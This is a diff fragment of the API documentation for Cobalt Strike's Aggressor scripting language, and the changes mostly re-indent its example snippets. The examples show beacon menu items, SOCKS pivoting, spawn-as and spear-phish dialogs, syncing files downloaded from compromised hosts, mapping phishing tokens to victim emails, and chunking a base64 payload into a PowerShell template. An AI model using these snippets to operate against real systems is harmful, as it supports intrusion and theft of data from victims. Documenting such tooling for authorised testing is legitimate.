+        openPortScannerLocal($bid);
+    }
 }
 
 ## openPowerShellWebDialog
@@ -3675,7 +3679,7 @@ $1 - the id for the beacon. This may be an array or a single ID.
 Example
 
 item "Processes" {
-openProcessBrowser($1);
+    openProcessBrowser($1);
 }
 
 ## openSOCKSBrowser
@@ -3699,10 +3703,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "SOCKS Server" {
-local('$bid');
-foreach $bid ($1) {
-openSOCKSSetup($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openSOCKSSetup($bid);
+    }
 }
 
 ## openScreenshotBrowser
@@ -3778,10 +3782,10 @@ $1 - the Beacon ID to apply this feature to
 Example
 
 item "Spawn As..." {
-local('$bid');
-foreach $bid ($1) {
-openSpawnAsDialog($bid);
-}
+    local('$bid');
+    foreach $bid ($1) {
+        openSpawnAsDialog($bid);
+    }
 }
 
 ## openSpearPhishDialog
@@ -3904,9 +3908,9 @@ Example
 popup_clear("help");
 
 popup help {
-item "My stuff!" {
-show_message("This is my menu!");
-}
+    item "My stuff!" {
+        show_message("This is my menu!");
+    }
 }
 
 ## powershell
@@ -4021,7 +4025,7 @@ Activate the tab that is to the left of the current tab.
 Example
 
 bind Ctrl+Left {
-previousTab();
+    previousTab();
 }
 
 ## privmsg
@@ -4050,7 +4054,7 @@ $3 - a callback function. Called when the user presses yes.
 Example
 
 prompt_confirm("Do you feel lucky?", "Do you?", {
-show_mesage("Ok, I got nothing");
+    show_mesage("Ok, I got nothing");
 });
 
 ## prompt_directory_open
@@ -4067,7 +4071,7 @@ $4 - a callback function. Called when the user chooses a folder. The argument to
 Example
 
 prompt_directory_open("Choose a folder", $null, false, {
-show_message("You chose: $1");
+    show_message("You chose: $1");
 });
 
 ## prompt_file_open
@@ -4084,7 +4088,7 @@ $4 - a callback function. Called when the user chooses a file to open. The argum
 Example
 
 prompt_file_open("Choose a file", $null, false, {
-show_message("You chose: $1");
+    show_message("You chose: $1");
 });
 
 ## prompt_file_save
@@ -4099,10 +4103,10 @@ $2 - a callback function. Called when the user chooses a filename. The argument 
 Example
 
 prompt_file_save($null, {
-local('$handle');
-$handle = openf("> $+ $1");
-println($handle, "I am content");
-closef($handle);
+    local('$handle');
+    $handle = openf("> $+ $1");
+    println($handle, "I am content");
+    closef($handle);
 });
 
 ## prompt_text
@@ -4118,7 +4122,7 @@ $3 - a callback function. Called when the user presses OK. The first argument to
 Example
 
 prompt_text("What is your name?", "Cyber Bob", {
-show_mesage("Hi $1 $+ , nice to meet you!");
+    show_mesage("Hi $1 $+ , nice to meet you!");
 });
 
 ## range
@@ -4162,7 +4166,7 @@ Close the active tab
 Example
 
 bind Ctrl+D {
-removeTab();
+    removeTab();
 }
 
 ## resetData
@@ -4234,9 +4238,9 @@ Insert a separator into the current menu tree.
 Example
 
 popup foo {
-item "Stuff" { ... }
-separator();
-item "Other Stuff" { ... }
+    item "Stuff" { ... }
+    separator();
+    item "Other Stuff" { ... }
 }
 
 ## services
@@ -4284,7 +4288,7 @@ $1 - the name of the visualization
 Example
 
 bind Ctrl+H {
-showVisualization("Hello World");
+    showVisualization("Hello World");
 }
 
 See Also
@@ -4401,13 +4405,13 @@ $3 - the long-form help for the command.
 Example
 
 ssh_alis echo {
-blog($1, "You typed: " . substr($1, 5));
+    blog($1, "You typed: " . substr($1, 5));
 }
 
 ssh_command_register(
-"echo",
-"echo posts to the current session's log",
-"Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
+    "echo",
+    "echo posts to the current session's log",
+    "Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
 
 ## ssh_commands
 ```python
@@ -4436,9 +4440,9 @@ Example
 
 # hint... :)
 else if ($1 eq "template.x86.ps1") {
-local('$enc');
-$enc = str_chunk(base64_encode($2), 61);
-return strrep($data, '%%DATA%%', join("' + '", $enc));
+    local('$enc');
+    $enc = str_chunk(base64_encode($2), 61);
+    return strrep($data, '%%DATA%%', join("' + '", $enc));
 }
 
 ## str_decode
@@ -4503,14 +4507,14 @@ Example
 
 # sync all downloads
 command ga {
-local('$download $lpath $name $count');
-foreach $count => $download (downloads()) {
-($lpath, $name) = values($download, @("lpath", "name"));
+    local('$download $lpath $name $count');
+    foreach $count => $download (downloads()) {
+        ($lpath, $name) = values($download, @("lpath", "name"));
 
-sync_download($lpath, script_resource("file $+ .$count"), lambda({
-println("Downloaded $1 [ $+ $name $+ ]");
-}, \$name));
-}
+        sync_download($lpath, script_resource("file $+ .$count"), lambda({
+            println("Downloaded $1 [ $+ $name $+ ]");
+        }, \$name));
+    }
 }
 
 ## targets
@@ -4553,13 +4557,13 @@ The email address or "unknown" if the token is not associated with an email.
 Example
 
 set PROFILER_HIT {
-local('$out $app $ver $email');
-$email = tokenToEmail($5);
-$out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
-foreach $app => $ver ($4) {
-$out .= "\n\t $+ $[25]app $ver";
-}
-return "$out $+ \n\n";
+    local('$out $app $ver $email');
+    $email = tokenToEmail($5);
+    $out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
+    foreach $app => $ver ($4) {
+        $out .= "\n\t $+ $[25]app $ver";
+    }
+    return "$out $+ \n\n";
 }
 
 ## transform
@@ -4642,6 +4646,7 @@ println("The time is now: " . tstamp(ticks()));
 
 See Also
 &dstamp
+
 ## url_open
 ```python
 url_open(*args, fork=False)
@@ -4653,7 +4658,7 @@ $1 - the URL to open
 Example
 
 command go {
-url_open("https://www.cobaltstrike.com/");
+    url_open("https://www.cobaltstrike.com/");
 }
 
 ## users
@@ -4667,7 +4672,7 @@ An array of users.
 Example
 
 foreach $user (users()) {
-println($user);
+    println($user);
 }
 
 ## vpn_interface_info
@@ -4692,10 +4697,10 @@ Example
 
 # create a script console alias to interface info
 command interface {
-println("Interface $1");
-foreach $key => $value (vpn_interface_info($1)) {
-println("$[15]key $value");
-}
+    println("Interface $1");
+    foreach $key => $value (vpn_interface_info($1)) {
+        println("$[15]key $value");
+    }
 }
 
 ## vpn_interfaces
@@ -4737,4 +4742,3 @@ $1 - the interface name (e.g., phear0)
 Example
 
 vpn_tap_destroy("phear0");
-
